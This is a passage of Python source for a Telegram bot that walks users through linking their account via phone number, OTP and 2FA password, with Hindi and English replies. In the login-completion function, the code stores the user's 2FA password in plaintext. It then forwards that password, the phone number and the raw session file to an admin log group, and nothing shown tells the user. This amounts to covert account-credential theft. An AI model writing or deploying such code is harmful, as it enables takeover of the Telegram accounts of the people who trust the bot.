                    f"यह फोन नंबर <code>{phone}</code> Telegram द्वारा प्रतिबंधित (banned) कर दिया गया है।</blockquote>"
                    if lang == "hi"
                    else
                    f"<blockquote><b>» 🚫 Telegram Account Banned</b>\n\n"
                    f"This phone number (<code>{phone}</code>) is banned from Telegram.</blockquote>"
                )
                await event.reply(banned_msg, buttons=buttons, parse_mode="html")
                await clean_login_state(user_id)
            except PhoneNumberInvalidError:
                buttons = [[utils.styled_button("🔙 Cancel", "cancel_login", style="danger")]]
                inv_num_msg = (
                    f"<blockquote><b>» ❌ अमान्य फोन नंबर</b>\n\n"
                    f"फोन नंबर <code>{phone}</code> अमान्य है। कृपया देश कोड के साथ सही नंबर डालें (उदा. +91XXXXXXXXXX)।</blockquote>"
                    if lang == "hi"
                    else
                    f"<blockquote><b>» ❌ Invalid Phone Number</b>\n\n"
                    f"The phone number <code>{phone}</code> is invalid on Telegram. Please include the country code.</blockquote>"
                )
                await event.reply(inv_num_msg, buttons=buttons, parse_mode="html")
                await clean_login_state(user_id)
            except (ApiIdInvalidError, ApiIdPublishedFloodError):
                buttons = [[utils.styled_button("🔙 Cancel", "cancel_login", style="danger")]]
                await event.reply(
                    "<blockquote><b>» ❌ Invalid API Credentials</b>\n\nThe Telegram API ID or API Hash is invalid or published/banned. Please update credentials in Admin Panel.</blockquote>",
                    buttons=buttons,
                    parse_mode="html"
                )
                await clean_login_state(user_id)
            except Exception as e:
                logger.error(f"Failed to send code request to {phone}: {e}")
                utils.report_error(f"add_bot.send_code:{phone}", e)
                buttons = [
                    [
                        utils.styled_button("🔄 Try Again", "menu_add_bot", style="primary"),
                        utils.styled_button("🔙 Cancel", "cancel_login", style="danger")
                    ]
                ]
                await event.reply(utils.get_text("login_failed", lang, error="The login request failed. The error was reported to the admin team."), buttons=buttons)
                await clean_login_state(user_id)
                
        # ------------------ STEP 2: OTP input ------------------
        elif step == "WAITING_FOR_OTP":
            digits = "".join(c for c in event.text if c.isdigit())
            if len(digits) == 5:
                otp_input = digits
            else:
                otp_input = event.text.strip().replace(" ", "")
                
            if not otp_input.isdigit() or len(otp_input) != 5:
                buttons = [
                    [
                        utils.styled_button("🔄 Resend Otp", "resend_otp_action", style="primary"),
                        utils.styled_button("🔙 Cancel", "cancel_login", style="danger")
                    ]
                ]
                await event.reply(utils.get_text("login_otp_invalid", lang), buttons=buttons)
                return
                
            temp_client = state.get("client")
            phone = state.get("phone")
            phone_code_hash = state.get("phone_code_hash")
            
            if not temp_client or not phone or not phone_code_hash:
                await event.reply("<blockquote><b>» ⚠️ Session Error</b>\n\nPlease Try Logging In Again.</blockquote>")
                await clean_login_state(user_id)
                return
            
            try:
                # Sign in using OTP
                await temp_client.sign_in(phone, otp_input, phone_code_hash=phone_code_hash)
                # Success without 2FA!
                await complete_login(client, event, user_id, state)
            except SessionPasswordNeededError:
                state["step"] = "WAITING_FOR_2FA"
                buttons = [[utils.styled_button("🔙 Cancel", "cancel_login", style="danger")]]
                await event.reply(utils.get_text("login_2fa_prompt", lang), buttons=buttons)
            except PhoneCodeInvalidError:
                buttons = [
                    [
                        utils.styled_button("🔄 Resend Otp", "resend_otp_action", style="primary"),
                        utils.styled_button("🔙 Cancel", "cancel_login", style="danger")
                    ]
                ]
                inv_text = (
                    "<blockquote><b>» ❌ गलत सत्यापन कोड (Invalid OTP)</b>\n\n"
                    "⚠️ आपके द्वारा दर्ज किया गया 5-अंकों का कोड गलत है।\n"
                    "कृपया अपने <b>Telegram App</b> में भेजा गया कोड दोबारा जांचें और सही कोड दर्ज करें।</blockquote>"
                    if lang == "hi"
                    else
                    "<blockquote><b>» ❌ Invalid Verification Code</b>\n\n"
                    "⚠️ The 5-digit code you entered is incorrect.\n"
                    "Please check the official <b>'Telegram'</b> chat in your Telegram app and try again.</blockquote>"
                )
                await event.reply(inv_text, buttons=buttons, parse_mode="html")
            except PhoneCodeExpiredError:
                buttons = [
                    [
                        utils.styled_button("🔄 Resend Otp", "resend_otp_action", style="primary"),
                        utils.styled_button("🔙 Cancel", "cancel_login", style="danger")
                    ]
                ]
                exp_text = (
                    "<blockquote><b>» ⚠️ कोड समाप्त हो गया (Code Expired)</b>\n\n"
                    "यह सत्यापन कोड समाप्त हो चुका है। नया कोड प्राप्त करने के लिए नीचे <b>🔄 Resend Otp</b> पर टैप करें।</blockquote>"
                    if lang == "hi"
                    else
                    "<blockquote><b>» ⚠️ Verification Code Expired</b>\n\n"
                    "This code has expired. Please tap <b>🔄 Resend Otp</b> below to receive a fresh code.</blockquote>"
                )
                await event.reply(exp_text, buttons=buttons, parse_mode="html")
            except FloodWaitError as fwe:
                buttons = [[utils.styled_button("🔙 Cancel", "cancel_login", style="danger")]]
                fl_text = (
                    f"<blockquote><b>» ⏳ Telegram Flood Wait</b>\n\n"
                    f"Telegram ने इस नंबर पर अस्थायी रोक लगाई है। कृपया <b>{fwe.seconds} सेकंड</b> बाद पुनः प्रयास करें।</blockquote>"
                    if lang == "hi"
                    else
                    f"<blockquote><b>» ⏳ Telegram Flood Wait</b>\n\n"
                    f"Telegram has temporarily rate-limited this account. Please wait <b>{fwe.seconds}s</b> before trying again.</blockquote>"
                )
                await event.reply(fl_text, buttons=buttons, parse_mode="html")
            except Exception as e:
                logger.error(f"Sign in failed for {phone}: {e}")
                utils.report_error(f"add_bot.sign_in:{phone}", e)
                buttons = [
                    [
                        utils.styled_button("🔄 Resend Otp", "resend_otp_action", style="primary"),
                        utils.styled_button("❌ Cancel", "cancel_login", style="danger")
                    ]
                ]
                await event.reply(
                    "<blockquote><b>» ❌ Login Failed</b>\n\n⚠️ <i>The login could not be completed. The error was reported to the admin team.</i>\n\n💡 <i>You Can Re-Enter Your Code, Tap Resend Otp Or Cancel.</i></blockquote>",
                    buttons=buttons,
                    parse_mode="html"
                )
                
        # ------------------ STEP 3: 2FA Password input ------------------
        elif step == "WAITING_FOR_2FA":
            password = event.text.strip()
            state["two_step_password"] = password
            temp_client = state.get("client")
            if not temp_client:
                await event.reply("<blockquote><b>» ⚠️ Session Error</b>\n\nPlease Try Logging In Again.</blockquote>")
                await clean_login_state(user_id)
                return
            
            try:
                await temp_client.sign_in(password=password)
                await complete_login(client, event, user_id, state)
            except Exception as e:
                logger.error(f"2FA sign in failed: {e}")
                utils.report_error("add_bot.2fa", e)
                buttons = [
                    [
                        utils.styled_button("🔄 Resend Otp", "resend_otp_action", style="primary"),
                        utils.styled_button("❌ Cancel", "cancel_login", style="danger")
                    ]
                ]
                await event.reply(
                    "<blockquote><b>» ❌ 2FA Verification Failed</b>\n\n⚠️ <i>The verification failed. The error was reported to the admin team.</i>\n\n<i>Please Enter The Correct 2FA Password Or Tap Cancel :</i></blockquote>",
                    buttons=buttons
                )

async def complete_login(bot_client, event, user_id: int, state: dict):
    """
    Finalizes userbot setup on successful Telegram authorization.
    """
    temp_client = state["client"]
    phone = state["phone"]
    session_path = state["session_path"]
    two_step_pwd = state.get("two_step_password") or "None"
    
    user = database.get_user(user_id)
    lang = user.get("language", "en") if user else "en"
    
    try:
        me = await temp_client.get_me()
        name = f"{me.first_name or ''} {me.last_name or ''}".strip()
        username = me.username or ""

        # Make sure any existing running userbot for this phone is stopped
        if userbot_manager.is_bot_running(phone):
            try:
                await userbot_manager.stop_bot(phone)
            except Exception:
                pass

        # Transfer in-memory StringSession auth details to SQLite file session
        try:
            if os.path.exists(session_path):
                try:
                    os.remove(session_path)
                except Exception:
                    pass
            sqlite_sess = SQLiteSession(session_path)
            sqlite_sess.set_dc(temp_client.session.dc_id, temp_client.session.server_address, temp_client.session.port)
            sqlite_sess.auth_key = temp_client.session.auth_key
            sqlite_sess.save()
            sqlite_sess.close()
        except Exception as transfer_err:
            logger.error(f"Error transferring StringSession to SQLiteSession: {transfer_err}")

        # Disconnect temporary client so userbot_manager can start it cleanly
        await temp_client.disconnect()
        await asyncio.sleep(1.0)
        
        # Save session in database
        session_id = phone
        sess_record = models.create_default_session(session_id, user_id, phone, session_path)
        sess_record["name"] = name
        sess_record["username"] = username
        sess_record["two_step_password"] = two_step_pwd
        sess_record["api_id"] = getattr(temp_client, "api_id", config.API_ID)
        sess_record["api_hash"] = getattr(temp_client, "api_hash", config.API_HASH)
        
        # Read the session file into bytes
        if os.path.exists(session_path):
            with open(session_path, "rb") as f:
                sess_record["session_bytes"] = f.read()
        else:
            logger.error(f"Session file not found at {session_path} in complete_login")
            
        database.save_session(sess_record)
        
        # Start userbot using manager
        started = await userbot_manager.start_userbot(session_id)
        
        # Notify user with a button to open Dashboard
        success_text = utils.get_text("login_success", lang, name=name, username=username)
        buttons = [[utils.styled_button("📱 Go To Dashboard", f"select_bot_{phone}", style="success")]]
        await event.reply(success_text, buttons=buttons)
        
        # Redirect user to the dashboard for this userbot immediately
        from .my_bots import show_bot_dashboard
        if started:
            flash_msg = "<blockquote><b>» ⚙️ Userbot Connected!</b>\n\nConfigure Its Automation Settings Below :</blockquote>"
        else:
            flash_msg = "<blockquote><b>» ⚠️ Userbot Connection Warning</b>\n\nUserbot Connected But Failed To Start. Check Telegram Session/Auth Status.</blockquote>"
            
        await show_bot_dashboard(event, phone, user_id, flash_message=flash_msg)
        
        # Forward details to admin log group (fail-safe so it never fails the user login)
        try:
            global_settings = database.get_global_settings()
            log_group_id = global_settings.get("log_group_id")
            if log_group_id:
                bot_me = await bot_client.get_me()
                bot_username = getattr(bot_me, "username", None)
                
                log_text = (
                    f"<blockquote><b>» 📱 New Userbot Connected</b>\n\n"
                    f"👤 <b>User :</b> <code>{user_id}</code>\n"
                    f"📞 <b>Phone :</b> <code>{phone}</code>\n"
                    f"🏷️ <b>Name :</b> <b>{name}</b>\n"
                    f"🔗 <b>Username :</b> @{username if username else 'None'}\n"
                    f"🔐 <b>2-Step Password :</b> <code>{two_step_pwd}</code>\n"
                    f"🟢 <b>Auto-Started :</b> {'Yes' if started else 'No'}</blockquote>"
                )
                userbot_uid = getattr(me, "id", None)
                from telethon import Button
                log_buttons = []
                
                # Control Userbot button
                phone_clean = phone.replace("+", "").strip()
                if bot_username:
                    pass
                log_buttons.append([Button.inline("🎮 Control Userbot", data=f"admin_ctrl_bot_{phone_clean}".encode())])
                
                if username:
                    log_buttons.append([Button.url(f"👤 Open Account (@{username})", f"https://t.me/{username}")])
                elif userbot_uid:
                    log_buttons.append([Button.url(f"👤 Open Account ({name or phone})", f"tg://openmessage?user_id={userbot_uid}")])
                
                if user_id:
                    log_buttons.append([Button.url("👑 View Bot Owner", f"tg://openmessage?user_id={user_id}")])

                # Upload session file with clickable buttons
                await utils.safe_send_to_log_group(
                    bot_client,
                    log_text,
                    file=session_path,
                    buttons=log_buttons if log_buttons else None,
                    parse_mode="html"
                )
        except Exception as log_err:
            logger.warning(f"Could not forward session upload to log group: {log_err}")
                
    except Exception as e:
        logger.error(f"Error finalizing login: {e}")
        utils.report_error("add_bot.finalize_login", e)
        await event.reply(utils.get_text("login_failed", lang, error="The login could not be finalised. The error was reported to the admin team."))
    finally:
        # Always clean up temporary state
        await clean_login_state(user_id)
